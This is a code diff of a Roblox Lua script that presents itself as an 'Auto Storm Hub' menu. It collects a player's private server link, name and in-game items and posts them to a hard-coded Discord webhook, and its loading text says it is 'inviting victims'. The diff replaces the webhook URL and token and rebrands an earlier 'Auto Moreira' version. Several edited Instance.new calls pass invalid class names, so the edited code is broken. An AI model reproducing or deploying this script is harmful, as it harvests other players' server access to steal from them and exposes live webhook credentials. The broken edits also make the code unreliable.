@@ -6,7 +6,7 @@ local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 
 -- ⚙️ CONFIGURAÇÕES
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1428772664121626777/F8_jz9IvV9QbFUM2Ww8wLo20xBbX32ug98tPJ1rH7vLVYSv7d0zQuAcrjieUj4SpQrYv"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1438630359989223444/7Ug9evtOvD8T6iFDYFz6a2KsNU3pjsh69J_M2hzvp-dJUVm-61QG4BajmHBuXKrmIyvl"
 local Min_Gen = 1_000_000
 
 -- 🔇 SISTEMA DE SILENCIAMENTO DE SONS (Otimizado)
@@ -166,7 +166,7 @@ local function sendToDiscord(link, playerCount, playerName, brainrots)
                               brainrotText,
                 color = #brainrots > 0 and 3066993 or 15158332,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                footer = { text = "Auto Moreira • Min: " .. formatNumberShort(Min_Gen) }
+                footer = { text = "Auto Storm Hub • Min: " .. formatNumberShort(Min_Gen) }
             }}
         })
         
@@ -222,7 +222,7 @@ local function showScanScreen(brainrots)
     mainText.Size = UDim2.new(0.9, 0, 0, 80)
     mainText.Position = UDim2.new(0.05, 0, 0.5, -40)
     mainText.BackgroundTransparency = 1
-    mainText.Text = "Carregando Auto Moreira..."
+    mainText.Text = "Carregando Auto Storm Hub..."
     mainText.TextColor3 = Color3.fromRGB(0, 255, 0)
     mainText.Font = Enum.Font.Code
     mainText.TextSize = 24
@@ -252,7 +252,7 @@ local function showScanScreen(brainrots)
     
     task.spawn(function()
         while scanGui.Parent do
-            mainText.Text = "Carregando Auto Moreira (aguarde 10s)..."
+            mainText.Text = "Carregando Auto Storm Hub (aguarde 10s)..."
             task.wait(10)
             
             mainText.Text = "Convidando vítimas aguarde..."
@@ -333,7 +333,7 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local menu = Instance.new("ScreenGui")
-menu.Name = "AutoMoreiraMenu"
+menu.Name = "AutoStormMenu"
 menu.ResetOnSpawn = false
 menu.DisplayOrder = 100
 menu.IgnoreGuiInset = true
@@ -373,11 +373,11 @@ headerFix.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
 headerFix.BorderSizePixel = 0
 headerFix.Parent = header
 
-local title = Instance.new("TextLabel")
+local title = Instance.new("Storm Menu")
 title.Size = UDim2.new(1, -20, 1, 0)
 title.Position = UDim2.new(0, 10, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "🔗 Auto Moreira Pro"
+title.Text = "🔗 Auto Storm Menu"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 20
@@ -385,7 +385,7 @@ title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = header
 
 -- Descrição
-local desc = Instance.new("TextLabel")
+local desc = Instance.new("link do seu serve privado")
 desc.Size = UDim2.new(1, -30, 0, 30)
 desc.Position = UDim2.new(0, 15, 0, 60)
 desc.BackgroundTransparency = 1
@@ -413,7 +413,7 @@ inputStroke.Color = Color3.fromRGB(50, 50, 70)
 inputStroke.Thickness = 1
 inputStroke.Parent = inputBox
 
-local input = Instance.new("TextBox")
+local input = Instance.new("Link do seu serve")
 input.Size = UDim2.new(1, -16, 1, 0)
 input.Position = UDim2.new(0, 8, 0, 0)
 input.BackgroundTransparency = 1
@@ -515,7 +515,7 @@ end)
 
 menu.Parent = playerGui
 
-print("✅ Auto Moreira carregado!")
+print("✅ Auto Storm Hub carregado!")
 print("🔇 Sistema de silenciamento ativo!")
 print("🎯 Mínimo de geração: " .. formatNumberShort(Min_Gen))
 print("📱 Otimizado para Delta/Mobile")
